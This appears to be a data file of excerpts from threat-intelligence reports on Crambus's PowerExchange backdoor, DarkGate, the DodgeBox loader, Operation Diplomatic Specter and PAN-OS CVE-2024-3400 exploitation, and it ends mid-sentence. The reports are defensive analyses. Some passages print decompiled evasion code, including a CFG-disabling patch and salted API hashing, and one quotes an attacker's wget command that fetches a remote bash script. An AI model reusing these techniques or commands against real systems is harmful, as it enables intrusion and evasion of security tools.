        "INPUT": "### Text Passage:\nTitle: Crambus: New Campaign Targets Middle Eastern Government\nThe Iranian Crambus espionage group (OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023. During the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results  to the attackers. Malicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more.\nIn addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP). There is also evidence the attackers modified Windows firewall rules in order to enable remote access.\n",

In recent years it has added a heavy social engineering component to the early stages of its attacks.\nIt most recently came to attention last year, when [Microsoft linked the group] to a destructive attack against the Albanian government. It assessed that Crambus was involved in gaining initial access and exfiltrating data from impacted networks. Wipers were likely then deployed by other Iran-linked actors.\n",

In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools.\n*   **Backdoor.Tokel:** Has the ability to execute arbitrary PowerShell commands and download files. The command and control (C&C) address is stored in a separate, RC4 encrypted file called token.bin, which is saved in the working directory.\n*   **Trojan.Dirps:** Used to enumerate all files in a directory and execute PowerShell commands.\n*   **Infostealer.Clipog:** Information stealing malware that is capable of copying clipboard data, capturing keystrokes and logging processes where keystrokes are entered.\n*   **Backdoor.PowerExchange:** PowerShell-based malware that can log into an Exchange Server with hardcoded credentials and monitor for emails sent by the attackers. It uses an Exchange Server as a C&C. Mails received with \u201c@@\" in the subject contain commands sent from the attackers which allows them to execute arbitrary PowerShell commands, write files and steal files. The malware creates an Exchange rule (called \u2018defaultexchangerules\u2019) to filter these messages and move them to the Deleted Items folder automatically.\n*   **Mimikatz:** [Publicly available] credential dumping tool. \n*   **Plink:** A [command-line connection tool] for the PuTTY SSH client\n",

This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email\u2019s that contain \u201c@@\u201d in the subject line are read by Backdoor.PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C.\nThe script allows four commands to execute:\n*   If an attachment is detected, it will decode it using Base64 and run it via PowerShell.\n*   cf: Decodes a Base64 string in the body of the email and executes it via PowerShell. The result of the command is sent back to the attacker via email.\n*   uf: Decodes the file path and the file contents using Base64 and calls WriteAllBytes to write the file to the system. \n*   df: Encodes a specified file with Base64 and sends it to the attacker via email. If the file is larger than 5MB it sends the following message to the attacker: \"Size is Greater than 5 MB\".\nThe attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior.\n",

        "INPUT": "### Text Passage:\n### **Decryption of Configuration Data**\nAfter gathering information about the targeted system's hardware, anti-malware programs and running processes, DarkGate malware incorporates this data into its decryption routine for its configuration. This configuration consists of multiple fields, each containing specific information the malware uses to adapt its behavior and evade detection. By adjusting its actions based on the collected data, the malware can better avoid analysis and remain hidden on the infected system.\nIn the most recent versions of DarkGate, the function to decrypt the configuration receives the encrypted buffer, buffer size and a hard-coded XOR key as inputs. It then creates a new decryption key using the provided key and proceeds to decrypt the configuration buffer as shown in Figures 12 and 13.\nFigure 12 shows the output of a debugger from a DarkGate sample first seen on March 14, 2024, after decrypting its configuration data.\n![Image 12: The image displays a screen of densely packed hexadecimal codes interspersed with ASCII characters, indicative of a data dump or computer code analysis. The included text references URLs, data references, and various technical terms.\nFigure 12. Configuration data extracted from a DarkGate sample first seen on March 14, 2024.\nFigure 13 shows the output of a debugger from a DarkGate sample first seen on April 16, 2024, after decrypting its configuration data.\n![Image 13: A screen filled with hexadecimal numerical values and scattered ASCII characters.\nFigure 13. Configuration data extracted from a DarkGate sample first seen on April 16, 2024.\nWe recently analyzed the configurations from DarkGate malware samples from a variety of campaigns. The fields appear as numbers with no description, but additional research can correlate some of these fields to functions or values of the malware sample.\nFor example, the raw configuration data shows 25=admin888 in Figures 12 and 13, and further analysis indicates this admin888 is the campaign identifier for those malware samples.\nIn some cases, the meaning of these fields is not clear. For example, Figures 12 and 13 both reveal an entry labeled 14=Yes, but we have not confirmed the specific function or value of this entry.\nDespite these unknown field values, the configuration data can reveal interesting details of DarkGate samples. For example, we found several different hard-coded XOR keys from samples using the same campaign identifier. And some samples with different XOR keys had not only the same campaign identifier, but also the same value for their C2 server.\nThe different XOR keys for samples with otherwise similar configuration characteristics could possibly be an attempt to hinder analysis of DarkGate samples.\nLet's review some examples of configuration data illustrating notable differences in XOR keys. These values are shown in JSON format, so numbers for any unidentified fields are prefaced with the string flag\\_. For example, 14=Yes from the raw configuration data is shown as \"flag\\_14\": \"Yes\", in JSON format.\n",

        "INPUT": "### Text Passage:\n#### 2\\. Execution guardrails and environment setup\nAfter decrypting its configuration, DodgeBox performs several environment checks to ensure it is running on its intended target.\n_Execution guardrail: Argument check_\nDodgeBox starts by verifying that the process was launched with the correct arguments. It scans the `argv` parameter for a specific string defined in `Config.szArgFlag`. Next, it calculates the MD5 hash of the subsequent argument and compares it to the hash specified in `Config.rgbArgFlagValueMD5`. In this case, DodgeBox expects the arguments to include `--type driver`. If this verification check fails, the process is terminated.\n_Environment setup: API Resolution_\nAfterwards, DodgeBox proceeds to resolve multiple APIs that are utilized for additional environment checks and setup. Notably, DodgeBox employs a salted FNV1a hash for DLL and function names. This salted hash mechanism aids DodgeBox in evading static detections that typically search for hashes of DLL or function names. Additionally, it enables different samples of DodgeBox to use distinct values for the same DLL and function, all while preserving the integrity of the core hashing algorithm.\nThe following code shows DodgeBox calling its `ResolveImport` function to resolve the address of `LdrLoadDll`, and populating its import table.\n```c\n// ResolveImport takes in (wszDllName, dwDllNameHash, dwFuncNameHash)\nsImportTable->ntdll_LdrLoadDll = ResolveImport(L\"ntdll\", 0xFE0B07B0, 0xCA7BB6AC);\n```\nInside the `ResolveImport` function, DodgeBox utilizes the FNV1a hashing function in a two-step process. First, it hashes the input string, which represents a DLL or function name. Then, it hashes a salt value separately. This two-step hashing procedure is equivalent to hashing the concatenation of the input string and salt. The following pseudo-code represents the implementation of the salted hash:\n```c\ndwHash = 0x811C9DC5;     // Standard initial seed for FNV1a\npwszInputString_Char = pwszInputString;\ncchInputString = -1LL;\ndo\n ++cchInputString;\nwhile ( pwszInputString[cchInputString] );\npwszInputStringEnd = (pwszInputString + 2 * cchInputString);\nif ( pwszInputString < pwszInputStringEnd )\n{\n do  // Inlined FNV1a hash\n {\n   chChar = *pwszInputString_Char;\n   pwszInputString_Char = (pwszInputString_Char + 1);\n   dwHash = 0x1000193 * (dwHash  chChar);\n }\n while ( pwszInputString_Char < pwszInputStringEnd );\n}\nv17 = &g_HashSaltPostfix;    // Salt value: CB 24 B4 BA\ndo  // Inlined FNV1a hash, use previous hash as seed\n{\n v18 = *v17;\n v17 = (v17 + 1);\n dwHash = 0x1000193 * (dwHash  v18);\n}\nwhile ( v17 < g_HashSaltPostfix_End );\n```\nA Python script to generate the salted hashes is included in the Appendix.\nIn addition to the salted hash implementation, DodgeBox incorporates another noteworthy feature in its `ResolveImport` function. This function accepts both the DLL name as a string and its hash value as arguments. This redundancy appears to be designed to provide flexibility, allowing DodgeBox to handle scenarios where the target DLL has not yet been loaded. In such cases, DodgeBox invokes the `LoadLibraryW` function with the provided string to load the DLL dynamically.\nFurthermore, DodgeBox effectively handles forwarded exports and exports by ordinals. It utilizes `ntdll!LdrLoadDll` and `ntdll!LdrGetProcedureAddressEx` when necessary to resolve the address of the exported function. This approach ensures that DodgeBox can successfully resolve and utilize the desired functions, regardless of the export method used.\n_Environment setup: DLL unhooking_\nOnce DodgeBox has resolved the necessary functions, it proceeds to scan and unhook DLLs that are loaded from the System32 directory. This process involves iterating through the `.pdata` section of each DLL, retrieving each function\u2019s start and end addresses, and calculating an FNV1a hash for the bytes of each function. DodgeBox then computes a corresponding hash for the same function's bytes as stored on disk. If the two hashes differ, potential tampering can be detected, and DodgeBox will replace the in-memory function with the original version from the disk.\nFor each DLL that has been successfully scanned, DodgeBox marks the corresponding `LDR_DATA_TABLE_ENTRY` by clearing the `ReservedFlags6` field and setting the upper bit to 1. This marking allows DodgeBox to avoid scanning the same DLL twice.\n_Environment setup: Disabling CFG_\nFollowing that, DodgeBox checks if the operating system is Windows 8 or newer. If so, the code verifies whether Control Flow Guard (CFG) is enabled by calling `GetProcessMitigationPolicy` with the `ProcessControlFlowGuardPolicy` parameter. If CFG is active, the malware attempts to disable it.\nTo achieve this, DodgeBox locates the `LdrpHandleInvalidUserCallTarget` function within `ntdll.dll` by searching for a specific byte sequence. Once found, the malware patches this function with a simple `jmp` `rax` instruction:\n```markdown\nntdll!LdrpHandleInvalidUserCallTarget:\n00007ffe`fc8cf070 48ffe0          jmp     rax\n00007ffe`fc8cf073 cc              int     3\n00007ffe`fc8cf074 90              nop\n```\nCFG verifies the validity of indirect call targets. When a CFG check fails, `LdrpHandleInvalidUserCallTarget` is invoked, typically raising an interrupt. At this point, the rax register contains the invalid target address. The patch modifies this behavior, calling the target directly instead of raising an interrupt, thus [bypassing CFG protection].\nIn addition, DodgeBox replaces `msvcrt!_guard_check_icall_fptr` with `msvcrt!_DebugMallocator<int>::~_DebugMallocator<int>`, a function that returns 0 to disable the CFG check performed by `msvcrt`.\n_Execution guardrail: MAC, computer name, and user name checks_\nFinally, DodgeBox performs a series of checks to verify if it is configured to run on the current machine. The malware compares the machine\u2019s MAC address against `Config.rgbTargetMac`, and compares the computer name against `Config.wszTargetComputerName`. Depending on the `Config.fDoCheckIsSystem` flag, DodgeBox checks whether it is running with `SYSTEM` privileges. If any of these checks fail, the malware terminates execution.\n",

        "INPUT": "### Text Passage:\n#### 3\\. Payload decryption and environment keying\n_Payload decryption_\nIn the final phase, DodgeBox commences the decryption process for the MoonWalk payload DAT file. The code starts by inspecting the first four bytes of the file. If these bytes are non-zero, it signifies that the DAT file has been tied to a particular machine, (which is described below). However, if the DAT file is not machine-specific, DodgeBox proceeds to decrypt the file using AES-CFB encryption, utilizing the key parameters stored in the configuration file. In the samples analyzed by ThreatLabz, this decrypted DAT file corresponds to a DLL, which is the MoonWalk backdoor.\n_Environment keying of the payload_\nAfter the decryption process, DodgeBox takes the additional step of keying the payload to the current machine. It accomplishes this by re-encrypting the payload using the Config.rgbAESKeyForDatFile key. However, in this specific scenario, the process deviates from the configuration file's IV (Initialization Vector). Instead, it utilizes the MD5 hash of the current machine's GUID as the AES IV. This approach guarantees that the decrypted DAT file cannot be decrypted on any other machine, thus enhancing the payload's security.\n_Loading the payload using DLL hollowing_\nNext, DodgeBox reflectively loads the payload using a DLL hollowing technique. At a high level, the process begins with the random selection of a host DLL from the `System32` directory, ensuring it is not on a blocklist (DLL blocklist available in the Appendix section) and has a sufficiently large .text section. A copy of this DLL is then created at `C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Data.Trace\\v4.0_4.0.0.0__<random bytes from pcrt4!UuidCreate>\\<name of chosen DLL>.dll`. DodgeBox modifies this copy by disabling the NX flag, removing the `reloc` and `TLS` sections, and patching its entry point with a simple `return 1`.\nFollowing the preparation of the host  DLL for injection, DodgeBox proceeds by zeroing the PE headers, and the `IMAGE_DATA_DIRECTORY` structures corresponding to the `import`, `reloc`, and `debug` directories of the payload DLL. This modified payload DLL is then inserted into the previously selected host DLL. The resulting copy of the modified host DLL is loaded into memory using the `NtCreateSection` and `NtMapViewOfSection` APIs.\nOnce the DLL is successfully loaded, DodgeBox updates the relevant entries in the Process Environment Block (PEB) to reflect the newly loaded DLL. To further conceal its activities, DodgeBox overwrites the modified copy of the host DLL with its original contents, making it appear as a legitimate, signed DLL on disk. Finally, the malware calls the entrypoint of the payload DLL.\nInterestingly, if the function responsible for DLL hollowing fails to load the payload DLL, DodgeBox employs a fallback mechanism. This fallback function implements a traditional form of reflective DLL loading using `NtAllocateVirtualMemory` and `NtProtectVirtualMemory`.\nAt this stage, the payload DLL has been successfully loaded, and control is transferred to the payload DLL by invoking the first exported function.\n",

        "INPUT": "### Text Passage:\n#### Call stack spoofing\nThere is one last technique employed by DodgeBox throughout all three phases discussed above: **call stack spoofing**. Call stack spoofing is employed to obscure the origins of API calls, making it more challenging for EDRs and antivirus systems to detect malicious activity. By manipulating the call stack, DodgeBox makes API calls appear as if they originate from trusted binaries rather than the malware itself. This prevents security solutions from gaining contextual information about the true source of the API calls.\nDodgeBox specifically utilizes call stack spoofing when invoking Windows APIs that are more likely to be monitored. As an example, it directly calls `RtlInitUnicodeString`, a Windows API that only performs string manipulation, instead of using stack spoofing.\n```c\n(sImportTable->ntdll_RtlInitUnicodeString)(v25, v26);\n```\nHowever, call stack spoofing is used when calling `NtAllocateVirtualMemory,` an API known to be abused by malware, as shown below:\n```c\nCallFunction(\n   sImportTable->ntdll_NtAllocateVirtualMemory,  // API to call\n   0,    // Unused\n   6LL,  // Number of parameters\n   // Parameters to the API\n   -1LL, &pAllocBase, 0LL, &dwSizeOfImage, 0x3000, PAGE_READWRITE)\n```\nThe technique mentioned above can be observed in the figures below. In the first figure, we can see a typical call stack when explorer.exe invokes the CreateFileW function. The system monitoring tool, SysMon, effectively walks the call stack, enabling us to understand the purpose behind this API call and examine the modules and functions involved in the process.\n![Image 8: Figure 2: Normal example of stack trace from explorer.exe calling CreateFileW.Figure 2: Normal example of stack trace from `explorer.exe` calling `CreateFileW`.\nIn contrast, the next figure shows the call stack recorded by SysMon when DodgeBox uses stack spoofing to call the CreateFileW function. Notice that there is no indication of DodgeBox\u2019s modules that triggered the API call. Instead, the modules involved all appear to be legitimate Windows modules.\n![Image 9: Figure 3:  Stack trace of DodgeBox calling CreateFileW using the stack spoofing technique.Figure 3:  Stack trace of DodgeBox calling `CreateFileW` using the stack spoofing technique.\nThere is an excellent [writeup] of this technique, so we will only highlight some implementation details specific to DodgeBox:\n*   When the `CallFunction` is invoked, DodgeBox uses a random `jmp qword ptr [rbp+48h]` gadget residing within the `.text` section of K`ernelBase`.\n*   DodgeBox analyzes the unwind codes within the `.pdata` section to extract the unwind size for the function that includes the selected gadget.\n*   DodgeBox obtains the addresses of `RtlUserThreadStart + 0x21` and `BaseThreadInitThunk + 0x14`, along with their respective unwind sizes.\n*   DodgeBox sets up the stack by inserting the addresses of `RtlUserThreadStart + 0x21`, `BaseThreadInitThunk + 0x14`, and the address of the gadget at the right positions, utilizing the unwind sizes retrieved.\n*   Following that, DodgeBox proceeds to insert the appropriate return address at `[rbp+48h]` and prepares the registers and stack with the necessary argument values to be passed to the API. This preparation ensures that the API is called correctly and with the intended parameters.\n*   Finally, DodgeBox executes a `jmp` instruction to redirect the control flow to the targeted API.\n",

Our confidence level in this attribution is medium.\n### Abuse of DLL sideloading\nDLL sideloading is a technique commonly utilized by APT groups with links to China. Typically, this method involves three essential components: a legitimate executable (EXE) file that is signed, a malicious DLL file, and an encrypted data file. While the specific combination of the EXE and DLL files mentioned here has not been publicly documented as being associated with APT41, the presence of these three components could indicate the involvement of a group linked to China.\n### Targeted regions\nAnalysis of the telemetry available in VirusTotal reveals that DodgeBox samples have been submitted from both Thailand and Taiwan. This observation aligns with previous instances of APT41 employing StealthVector in campaigns primarily targeting users in the Southeast Asian (SEA) region.\nFurthermore, during the monitoring of the attacker-controlled Google Drive account utilized for C2 communication, a spreadsheet containing the personal details of individuals from India was discovered.

        "INPUT": "### Text Passage:\nTitle: Operation Diplomatic Specter: An Active Chinese Cyberespionage Campaign Leverages Rare Tool Set to Target Governmental Entities in the Middle East, Africa and Asia\n**Executive Summary**\n---------------------\nA Chinese advanced persistent threat (APT) group has been conducting an ongoing campaign, which we call Operation Diplomatic Specter. This campaign has been targeting political entities in the Middle East, Africa and Asia since at least late 2022.\nAn analysis of this threat actor\u2019s activity reveals long-term espionage operations against at least seven governmental entities. The threat actor performed intelligence collection efforts at a large scale, leveraging rare email exfiltration techniques against compromised servers.\nThis collection effort includes attempts to obtain sensitive and classified information about the following entities, focusing on current geopolitical affairs:\n*   Diplomatic and economic missions\n*   Embassies\n*   Military operations\n*   Political meetings\n*   Ministries of the targeted countries\n*   High-ranking officials\nAs part of its espionage activities, the group makes use of a previously undocumented family of backdoors, including those that we have named TunnelSpecter and SweetSpecter.\nThe threat actor appears to closely monitor contemporary geopolitical developments, attempting to exfiltrate information daily. The threat actor\u2019s modus operandi in cases we observed was to infiltrate targets\u2019 mail servers and to search them for information. We observed multiple efforts to maintain persistence, including repeated attempts to adapt and regain access when the actor\u2019s activities were disrupted. They also appear to return to the well to search for relevant information when new geopolitical events occur.\nWe assess with high confidence that a single threat actor orchestrates Operation Diplomatic Specter, operating on behalf of Chinese state-aligned interests. The tactics observed as part of this campaign show the extent to which Chinese state-aligned threat actors attempt to gather information about affairs beyond the Asian region, even extending into the Middle East and Africa.\nIt is unclear exactly how threat actors are using the intelligence collected as part of this campaign. However, the topics the threat actors searched for reveal information about many key players in these regions and their connections to China and other parts of the world. The topics they searched for provide researchers a window into the possible priorities of Chinese state-aligned threat actors.\nIn addition, the threat actor\u2019s repeated use of Exchange server exploits (ProxyLogon [CVE-2021-26855] and ProxyShell [CVE-2021-34473]) for initial access further emphasizes the importance for organizations to harden and patch sensitive internet-facing assets. This is especially true for known and prominent vulnerabilities, to reduce the attack surface and maximize protection efforts.\nOrganizations that safeguard sensitive information should pay particular attention to commonly exploited vulnerabilities. They should also adhere to best practices when it comes to IT hygiene, as APTs often seek to gain access through methods they know have been effective in the past.\nLastly, we are sharing our analysis to provide defenders with means to detect and protect themselves against such advanced attacks.\n",

These regions include Africa, the Middle East, and southeast Asia.\nFigure 1. Regions targeted in Operation Diplomatic Specter.\nMoreover, the threat actor appears to closely monitor contemporary geopolitical developments, demonstrating an intent to acquire information associated with ongoing events. The campaign has been operating since at least late 2022, with automatic exfiltration attempts occurring daily, in addition to periodic efforts involving more hands-on-keyboard attention from the threat actor.\nThese events encompass a wide range of subjects, including the following:\n*   Military operations\n*   Meetings\n*   Summits\n*   Conflicts\n*   Other pertinent aspects of current geopolitical affairs\nIn some cases, the threat actor searched for particular keywords and exfiltrated anything they could find related to them, such as entire archived inboxes belonging to particular diplomatic missions or individuals. The threat actor also exfiltrated files related to topics they were searching for.\nIn other cases, the threat actor\u2019s exfiltration appeared more targeted and exfiltration focused on the results of more specific searches.

The details we\u2019re sharing about this campaign are part of our ongoing investigation into an apparent Chinese state-aligned APT group.\nSince late 2022, we have been tracking an activity cluster targeting governmental entities in the Middle East, Africa and Asia. In earlier stages of our tracking, we referred to the cluster as \"[CL-STA-0043],\u201d indicating a cluster of activity that we suspect is associated with state-backed motivation (as described in \u201c[It\u2019s All in the Name: How Unit 42 Defines and Tracks Threat Adversaries]\u201d).\nWe published on CL-STA-0043 in June 2023 in \u201c[Through the Cortex XDR Lens: Uncovering a New Activity Group Targeting Governments in the Middle East and Africa].\u201d\nIn December 2023, Unit 42 published additional information related to CL-STA-0043 in \u201c[New Tool Set Found Used Against Organizations in the Middle East, Africa and the US].\u201d\nThe tactics, techniques and procedures (TTPs) associated with the threat actor behind this cluster are relatively unique and rare. Some of these TTPs had not been reported as being used in the wild before, and some were reported used only a handful of times. For in-depth details of the TTPs observed in association with Operation Diplomatic Specter, please see [Appendix A].\nThe threat actor demonstrated adaptability in attempting to thwart various mitigation efforts. They also sought to maintain a persistent presence in compromised environments through the use of two novel and previously undocumented malware strains \u2013 SweetSpecter and TunnelSpecter.\nWe will cover the key details of these backdoors in the following section, [Meet the Specter Family]. For a deeper dive, please see [Appendix B].\nAfter meticulously monitoring the threat actor's activities, evolution and changes over a year, we graduated the activity cluster CL-STA-0043 to a temporary actor group (TGR-STA-0043) according to Unit 42\u2019s [cluster maturation process]. Essentially, the graduation indicates our confidence that a single actor is behind the activity observed, and that we\u2019ve established \u201cseveral correlation points over time and across activity clusters.\u201d\nIn relation to this process, we note that the threat actor appears to be aligned with Chinese state interests and bears the hallmarks of Chinese APTs.

During our investigation, we uncovered a pair of unique and stealthy backdoors that we call the Specter family, including TunnelSpecter and SweetSpecter.\nWe named the pair the Specter family to acknowledge a similarity to Gh0st RAT (described below). TunnelSpecter\u2019s name refers to its DNS tunneling functionality and SweetSpecter\u2019s name references similarities to the SugarGh0st RAT specifically.\nThe attackers used these backdoors to maintain stealthy access to their targets\u2019 networks. The backdoors also provided them with the ability to execute arbitrary commands, exfiltrate data, and deploy further malware and tools on the infected hosts.\nAccording to our analysis, we believe with a high level of confidence that these two distinct backdoors borrowed small portions of code from the [Gh0st RAT] source code that was leaked in 2008. However, these new backdoors appear to differ from other known Gh0st RAT variants.\n",

This file that the web shell dropped under the SysWOW64 folder was executed using a renamed rundll32.exe process.\nWhen investigating this binary, we found that it has a notable string in memory: Game Over Good Luck By Wind. Figure 6 shows that this string was also observed in the Gh0st RAT variant used in [Operation Iron Tiger] \\[PDF\\] back in 2015.

The threat actor searched for highly sensitive information, encompassing details about military operations, diplomatic missions and embassies and foreign affairs ministries.\nOur research spanned over a year and tightly monitored this activity, revealing that the threat actor (which we track as TGR-STA-0043) possesses potential motivation and modus operandi aligned with Chinese APT groups.\nBesides using a rare set of tools TGR-STA-0043 stands out for its persistence and adaptability. The threat actor unabashedly resumes operations even after exposure, displaying a flagrant element to its nature.\nNotably, TGR-STA-0043 continues to leverage known vulnerabilities in internet-facing servers. This underscores the need for heightened vigilance and fortified cybersecurity measures across global governments and organizations.\nA resilient defense mechanism is not only essential for thwarting evolving cyberthreats but also for preserving the confidentiality, integrity and availability of critical information. In cultivating a strong security posture, nations can better safeguard their interests, protect against potential vulnerabilities and ensure the overall resilience of their cybersecurity frameworks.\n",

TGR-STA-0043\u2019s characteristics broken down by the attack lifecycle observed as part of Operation Diplomatic Specter.\nAs part of our observations of Operation Diplomatic Specter, we saw a distinctive set of TTPs. These TTPs indicate a high level of coordination, technical skill and determination \u2013 characteristics often associated with a nation-state threat actor. We [previously wrote] a deep technical analysis of the flow of the attack and the main TTPs.\n### **Overview of TGR-STA-0043\u2019s Tools and Malware**\n_Table 1. TGR-STA-0043\u2019s tools and malware._\nA review of the main TTPs follows:\n#### Targeted Data Exfiltration From Exchange Servers\nIn the context of targeted data exfiltration, TGR-STA-0043 exhibited a meticulous approach, particularly when abusing the Exchange Management Shell for stealing hundreds of emails and adding PowerShell snap-in (PSSnapins) to steal emails through a script. The threat actor strategically used those techniques to steal sensitive emails by employing specific keywords for data identification. Those keywords served as critical indicators enabling us, as researchers, to gain a precise understanding of the information targeted by TGR-STA-0043.\n#### Credential Theft Using Network Providers\nWithin the realm of credential theft, TGR-STA-0043 showcased a variety of credential theft methodologies. While deploying well-known techniques such as Mimikatz and dumping the Sam key, the threat actor also introduced an uncommon credential theft tactic.\nThis novel approach involved the execution of a PowerShell script to register a new network provider, a method recognized as a proof of concept (PoC) named [NPPSpy], and alternatively known as [Ntospy] by Unit 42. This technique is rare and has been reported only a handful of times in the past.\n#### In-Memory VBS Implant\nTo infiltrate the network, TGR-STA-0043 strategically focused on exploiting vulnerabilities within Microsoft Exchange servers and public-facing web servers. The threat actor successfully gained access to specific targeted environments through the deployment of in-memory VBScript implants. This tactic not only underscored TGR-STA-0043's technical proficiency but also highlighted their ability to execute web shells in a clandestine manner on-the-fly, while attempting to bypass security mitigations.\n#### Debut of the Yasso Penetration Tool Set\nThe emergence of a relatively new penetration testing tool set, Yasso, marked a shift in the tactics employed by TGR-STA-0043. This tool set encompassed a range of functionalities, including the following:\n*   Scanning\n*   Brute forcing\n*   Remote interactive shell capabilities\n*   Arbitrary command execution\nWhat set Yasso apart was its unique feature set, incorporating powerful SQL penetration functions and database capabilities. Until the time of this article, this had not been publicly reported as being used in the wild by another threat actor.\n",

Figure 8 shows that threat authors hard-coded this backdoor with a unique username, SUPPORT\\_388945c0. Notably, this username is a deliberate attempt to mimic the default account [SUPPORT\\_388945a0], commonly associated with the Windows Remote Assistance feature.\nAn indication of the tailored nature of this malware is the preemptive creation of the same account (SUPPORT\\_388945c0). The threat actor created this account using a web shell within the compromised environment several weeks prior to the deployment of TunnelSpecter. The threat actor used TunnelSpecter to create the user, in the event that they failed to create it using the web shell. They then added the user (newly or previously created) to the Administrators group.\n![Image 8: Image 8 is a screenshot of many lines of code. Highlighted in a red box is the embedded username and password. ]\nFigure 8. Embedded username and password in TunnelSpecter.\nThe main functionality of TunnelSpecter includes:\n*   **Fingerprinting** the infected machine and creating a unique identifier for each infected host, based on the CRC32 hash of the machine's cpuid value.\n*   **Executing arbitrary commands** by implementing a remote command-line interface. The supported commands can gather different information about the infected machine, such as the operating system version or host details.\n*   **DNS tunneling C2 communication** while encrypting communication using a hard-coded Caesar cipher on top of hex encoding. When transmitting data, TunnelSpecter prepends the unique machine identifier followed by a predetermined flag (b, c, d or z) and then the stolen data content. Figure 9 below shows this communication.\n![Image 9: Image 9 is a screenshot of many lines of code as TunnelSpecter implements a DNS tunneling communication. ]\nFigure 9.

We noticed the changes in the C2 servers used by the threat actor, and we monitored these alterations.\nIn addition, we were able to uncover additional servers that are part of this complex operational infrastructure by pivoting on strategic data points, based on the already established knowledge of the infrastructure.\nOur investigation revealed indications that threat actors employed a substantial portion of the correlated infrastructure, either presently or historically, as C2 servers for two prominent pieces of malware: [PlugX] and [Trochilus RAT]. These two pieces of malware (especially PlugX) are largely associated with Chinese threat actors. However, other threat actors can access and use them as well.\nAs depicted in Figure 14 below, we found multiple IP addresses related to the infrastructure, as well as domains and subdomains. A particularly noteworthy facet of our observations pertains to the threat actor's deliberate endeavors to assume the guise of both legitimate Microsoft servers (e.g., \\*.microsoft-ns1.com) and governmental entities. For example, \\*.govu.ml masquerades as a Mali-government address. (The threat actor\u2019s impersonation does not imply any issues with the legitimate servers or governmental entities.)\n![Image 14: Image 14 is a Maltego graph tracking the infrastructure.

This IP was also observed in three different operations:\n*   [Space Pirates], which was not formally attributed to any specific group, but it was attributed to Chinese threat actors\n*   [Operation Iron Tiger \\[PDF\\]], which was attributed to [Iron Taurus]\n*   [Operation Exorcist \\[PDF\\]], which was not formally attributed to a specific Chinese APT, though the authors of that report found overlaps with [Stately Taurus] (Mustang Panda)\n#### SSL/TLS Certificate Overlaps/Pivoting\nThe other overlaps observed are related to the use of the same SSL certificate (SHA256: 3d74df40e3d2730941ff64f275217ae6d46b20d7fbbd04123bc156daf8f6e85c).

Extensive mapping of the activity's working hours over several months revealed a notable and consistent pattern.\nFigure 15 below shows our findings indicate a strong alignment with a standard 9-to-5 workday within the UTC+8 time zone. This time frame notably corresponds to the working hours of several Asian countries, including but not limited to China.\n![Image 15: Image 15 is a diagram of the hourly activity mapped between standard Universal Time in red and the UTC+8 time in green, comparing a standard workday of 9:00 AM to 5:00 PM. The hours correspond. ]\nFigure 15. TGR-STA-0043 hourly breakdown of activity.\n### Linguistic Artifacts\nDuring our investigation, we acquired several scripts and files that prominently feature numerous comments and debug strings in Mandarin, suggesting that the scripts\u2019 creators are Mandarin-speaking individuals. One of those files is a web shell found on one compromised environment.\nFurther inspection of the code revealed a subtle resemblance between the code in the web shell we obtained and a GitHub repository of a penetration testing PoC tool. This tool is named [GetShell]%E5%89%8D%E5%8F%B0Getshell.md), and was created three years ago.\nIt is possible that the web shell used by the threat actor borrowed code from this existing repository. However, the threat actor appears to tailor the code to suit specific targets, modifying it based on the nature of the targeted data.\nIn particular, we identified a customized version of this web shell deployed on the Exchange servers of one of the targets. This modified version, named ManagementMailboxPicker.aspx, demonstrated functionalities focused on file uploads and not limited to images, as shown in Figure 16.\nOur analysis suggests that the threat actor leveraged this web shell to manage the upload of files, potentially .pst and archive files containing email data. The nomenclature ManagementMailboxPicker.aspx further implies its role in the manipulation of mailbox-related activities.\n![Image 16: Image 16 is a screenshot of many lines of code.

The next section covers details of the post-exploitation activity we\u2019ve observed.\nCurrent Scope of the Attack\n---------------------------\nPalo Alto Networks has classified observations of attempted exploitation into several levels, from Level 0 to Level 3. In all cases we recommend following the guidance in the [Security Advisory].\n**Level 0: Probe \u2013** An unsuccessful exploitation attempt. Forensic artifacts indicate that the attempt was made to access the customer network, but the attacker did not actually succeed. Palo Alto Networks assesses there is likely _little to no_ immediate impact of a Level 0 attempt.\n**Level 1: Test** **\u2013 The vulnerability was being tested on the device. A 0-byte file has been created and is resident on the firewall. However, there is no indication of any known unauthorized command execution.**\n**Level 2: Potential Exfiltration \u2013** A file on the device has been copied to a location accessible via a web request, though the file may or may not have been subsequently downloaded. Typically, the file we have observed being copied is running\\_config.xml.\n**Level 3: Interactive Access** **\u2013** There are signs of interactive command execution. This may include shell-based backdoors, introduction of code, downloading files or running commands.\nIt is important to note that _the vast majority of cases that Unit 42 has responded to have been unsuccessful attempts to exploit the vulnerability and some Level 1 compromises of PAN-OS_. Other cases have included limited Level 2 and very limited Level 3 compromises of those targeted firewalls.\n",

        "INPUT": "### Text Passage:\nUPSTYLE and Cron Job Backdoor Activity\n--------------------------------------\nAs part of the activity observed in Operation MidnightEclipse, the threat actor exploited CVE-2024-3400 to run commands on the firewall. We have determined that the threat actor initially intended to install a Python-based backdoor, which our colleagues at Volexity referred to as UPSTYLE.\nWe believe the threat actors created UPSTYLE specifically for this campaign. However, the threat actors were unsuccessful at installing UPSTYLE after three different exploit attempts. After the third failed attempt, the threat actor decided to install a cron job backdoor to carry out their post-exploitation activities.\nAfter failing to install UPSTYLE, the threat actor was observed exploiting CVE-2024-3400 to run a handful of the commands on the firewall. The commands included copying configuration files to the web application folder and exfiltrating them via HTTP requests to those files.\nThe following IP address was seen attempting to access a specific configuration file copied to this folder, which we believe is a VPN used by the threat actor:\n*   66.235.168.222\nAfter gathering configuration files, the threat actor exploited the vulnerability to run the following command to receive additional commands from an external server in the form of a bash script:\n*   wget -qO- hxxp://172.233.228.93/patchbash\nWe were unable to access the bash script hosted at this URL. However, shortly after we 